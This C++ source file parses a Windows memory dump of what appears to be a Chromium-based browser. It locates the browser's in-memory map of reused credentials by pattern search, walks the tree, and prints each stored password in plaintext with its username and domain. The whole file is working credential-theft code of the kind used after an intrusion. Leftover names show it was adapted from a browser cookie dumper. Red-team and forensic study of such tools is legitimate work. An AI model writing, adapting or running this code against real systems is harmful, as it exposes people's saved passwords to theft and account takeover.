#include <Windows.h>
#include <cstdint>
#include "udmp-parser.h"
#include "Helper.h"

#pragma region structs

struct WideOptimizedString {
	wchar_t buf[11];
	char unk[1];
	UCHAR len;
};

struct OptimizedString {
	char buf[23];
	UCHAR len;
};

struct RemoteString {
	uintptr_t dataAddress;
	size_t strLen; //This won't include the null terminator
	int strMax; //Maximum string length
	char unk[3]; //I just couldn't figure out the last data type :(
	UCHAR strAlloc; //Seems to always be 0x80, honestly no idea what it should mean
};

enum class Store {
	// Default value.
	kNotSet = 0,
	// Credential came from the profile (i.e. local) storage.
	kProfileStore = 1 << 0,
	// Credential came from the Gaia-account-scoped storage.
	kAccountStore = 1 << 1,
	kMaxValue = kAccountStore
};

struct MatchingReusedCredential {
	uintptr_t left;
	uintptr_t right;
	uintptr_t parent;
	bool is_black; //My guess is that data is stored in red-black tree
	char padding[7];

	OptimizedString domain;
	BYTE GURL[120];
	WideOptimizedString username;
	Store credentialStore;
};

struct Node {
	uintptr_t left;
	uintptr_t right;
	uintptr_t parent;
	bool is_black; //My guess is that data is stored in red-black tree
	char padding[7];
	WideOptimizedString key;
	uintptr_t valueAddress;
};

struct RootNode {
	uintptr_t beginNode;
	uintptr_t firstNode;
	size_t size;
};
#pragma endregion

BOOL MyMemCmp(const BYTE* source, const BYTE* searchPattern, size_t num) {

	for (size_t i = 0; i < num; ++i) {
		if (searchPattern[i] == 0xAA)
			continue;
		if (source[i] != searchPattern[i]) {
			return FALSE;
		}
	}

	return TRUE;
}

BOOL PatternSearch(const BYTE* pattern, size_t patternSize, const uint8_t* source, SIZE_T sourcesize, uintptr_t& offset) {

	for (size_t i = 0; i <= sourcesize - patternSize; ++i) {
		if (MyMemCmp(source + i, pattern, patternSize)) {
			offset = i;
			return TRUE;
		}
	}
	return FALSE;
}

BOOL FindLargestSection(udmpparser::UserDumpParser& dump, std::string moduleName, uintptr_t& resultAddress) {

	SIZE_T largestRegion = 0;

	for (const auto& [_, Descriptor] : dump.GetMem()) {
		const char* State = StateToString(Descriptor.State);
		const char* Type = TypeToString(Descriptor.Type);

		if (strcmp(State, "MEM_COMMIT") != 0)
			continue;
		if (strcmp(Type, "MEM_IMAGE") != 0)
			continue;
		if ((Descriptor.Protect & PAGE_READONLY) == 0)
			continue;
		if (Descriptor.DataSize == 0)
			continue;

		//Check if memory area is a module
		const auto& Module = dump.GetModule(Descriptor.BaseAddress);

		//Skip over other areas and modules
		if (Module == nullptr || Module->ModuleName.find(moduleName) == std::string::npos)
			continue;

		if (Descriptor.RegionSize > largestRegion) {
			largestRegion = Descriptor.RegionSize;
			resultAddress = Descriptor.BaseAddress;
		}
	}
	if (largestRegion > 0)
		return TRUE;

	return FALSE;
}

void PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
	size_t szAddr = sizeof(uintptr_t) - 1;
	for (offset -= 1; szAddr > 3; offset--) {
		pattern[offset] = baseAddrPattern[szAddr];
		szAddr--;
	}
}

BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress) {

	//Copy the pattern
	BYTE* newPattern = (BYTE*)malloc(sizeof(BYTE) * patternSize);
	for (size_t i = 0; i < patternSize; i++)
		newPattern[i] = pattern[i];

	BYTE baseAddrPattern[sizeof(uintptr_t)];
	ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));

	PatchPattern(newPattern, baseAddrPattern, 40);
	PatchPattern(newPattern, baseAddrPattern, 48);

	return newPattern;
}

BOOL FindPattern(udmpparser::UserDumpParser& dump, const BYTE* pattern, size_t patternSize, uintptr_t* CookieMonsterInstances, size_t& instanceCount) {

	for (const auto& [_, Descriptor] : dump.GetMem()) {
		const char* State = StateToString(Descriptor.State);
		const char* Type = TypeToString(Descriptor.Type);

		if (strcmp(State, "MEM_COMMIT") != 0)
			continue;
		if (strcmp(Type, "MEM_PRIVATE") != 0)
			continue;
		if ((Descriptor.Protect & PAGE_READWRITE) == 0)
			continue;
		if (Descriptor.DataSize == 0)
			continue;

		BYTE* newPattern = PatchBaseAddress(pattern, patternSize, Descriptor.BaseAddress);

		for (size_t i = 0; i <= Descriptor.DataSize - patternSize; ++i) {
			if (MyMemCmp(Descriptor.Data + i, newPattern, patternSize)) {
				uintptr_t resultAddress = Descriptor.BaseAddress + i;
				uintptr_t offset = resultAddress - Descriptor.BaseAddress;
#ifdef _DEBUG
				PRINT("Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
					(void*)Descriptor.AllocationBase,
					(void*)Descriptor.BaseAddress,
					offset);
#endif
				if (instanceCount >= 100) {
					free(newPattern);
					return TRUE;
				}

				CookieMonsterInstances[instanceCount] = resultAddress;
				instanceCount++;
			}
		}
	}

	if (instanceCount > 0)
		return TRUE;
	return FALSE;
}

BOOL ReadDumpMemory(udmpparser::UserDumpParser& dump, uint64_t address, LPVOID target, size_t readsize) {
	auto data = dump.ReadMemory(address, readsize);
	if (!data.has_value())
		return FALSE;

	if (data.value().size() != readsize)
		return FALSE;

	memcpy_s(target, readsize, data.value().begin()._Ptr, readsize);
	return TRUE;
}

void ReadWideString(udmpparser::UserDumpParser& dump, WideOptimizedString string) {

	if (string.len > 11)
	{
		RemoteString longString = { 0 };
		std::memcpy(&longString, &string.buf, sizeof(RemoteString));

		if (longString.dataAddress != 0) {
#ifdef _DEBUG
			printf("Attempting to read the credential value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
			wchar_t* buf = (wchar_t*)malloc((longString.strMax + 1) * 2);
			if (buf == 0 || !ReadDumpMemory(dump, longString.dataAddress, buf, (longString.strLen + 1) * 2)) {
				printf("[-] Failed to read cookie value at: 0x%p", (void*)longString.dataAddress);
				free(buf);
				return;
			}
			printf("%ls\n", buf);
			free(buf);
		}
	}
	else
		printf("%ls\n", string.buf);

}

void ReadString(udmpparser::UserDumpParser& dump, OptimizedString string) {

	if (string.len > 23)
	{
		RemoteString longString = { 0 };
		std::memcpy(&longString, &string.buf, sizeof(RemoteString));

		if (longString.dataAddress != 0) {
			unsigned char* buf = (unsigned char*)malloc(longString.strMax);
			if (buf == 0 || !ReadDumpMemory(dump, longString.dataAddress, buf, longString.strLen + 1)) {
				printf("[-] Failed to read cookie value at: 0x%p", (void*)longString.dataAddress);
				free(buf);
				return;
			}
			printf("%s\n", buf);
			free(buf);
		}
	}
	else
		printf("%s\n", string.buf);

}

void PrintValues(udmpparser::UserDumpParser& dump, MatchingReusedCredential creds) {
	printf("    Name: ");
	ReadWideString(dump, creds.username);
	printf("    Domain: ");
	ReadString(dump, creds.domain);
	if (creds.credentialStore == Store::kNotSet)
		printf("    CredentialStore: NotSet");
	else if (creds.credentialStore == Store::kAccountStore)
		printf("    CredentialStore: AccountStore");
	else if (creds.credentialStore == Store::kProfileStore)
		printf("    CredentialStore: ProfileStore");
	else if (creds.credentialStore == Store::kMaxValue)
		printf("    CredentialStore: MaxValue");
	else
		printf("    CredentialStore: Error!");

	printf("\n\n");
}

void ProcessNodeValue(udmpparser::UserDumpParser& dump, uintptr_t Valueaddr) {

	MatchingReusedCredential creds = { 0 };
	if (!ReadDumpMemory(dump, Valueaddr, &creds, sizeof(MatchingReusedCredential))) {
		PrintErrorWithMessage(TEXT("Failed to read credential struct"));
		return;
	}
	PrintValues(dump, creds);
}

void ProcessNode(udmpparser::UserDumpParser& dump, const Node& node) {
	// Process the current node
	printf("Credential entry:\n");
	printf("    Password: ");
	ReadWideString(dump, node.key);

	ProcessNodeValue(dump, node.valueAddress);

	// Process the left child if it exists
	if (node.left != 0) {
		Node leftNode;
		if (ReadDumpMemory(dump, node.left, &leftNode, sizeof(Node)))
			ProcessNode(dump, leftNode);
		else
			printf("Error reading left node");
	}

	// Process the right child if it exists
	if (node.right != 0) {
		Node rightNode;
		if (ReadDumpMemory(dump, node.right, &rightNode, sizeof(Node)))
			ProcessNode(dump, rightNode);
		else
			printf("Error reading right node");
	}
}

void WalkCredentialMap(udmpparser::UserDumpParser& dump, uintptr_t cookieMapAddress) {

	RootNode credentialMap;

	if (!ReadDumpMemory(dump, cookieMapAddress, &credentialMap, sizeof(RootNode))) {
		printf("[-] Failed to read the root node from address: 0x%p\n", (void*)cookieMapAddress);
		return;
	}

	if (credentialMap.size == 0) {
		printf("[*] This cookie map was empty\n\n");
		return;

	}
	printf("[*] Number of available credentials: %Iu\n\n", credentialMap.size);

	// Process the first node in the binary search tree
	Node firstNode;
	if (ReadDumpMemory(dump, credentialMap.firstNode, &firstNode, sizeof(Node)))
		ProcessNode(dump, firstNode);
	else
		printf("[-] Failed to read the first node from address: 0x%p\n", (void*)credentialMap.firstNode);

	printf("\n");
}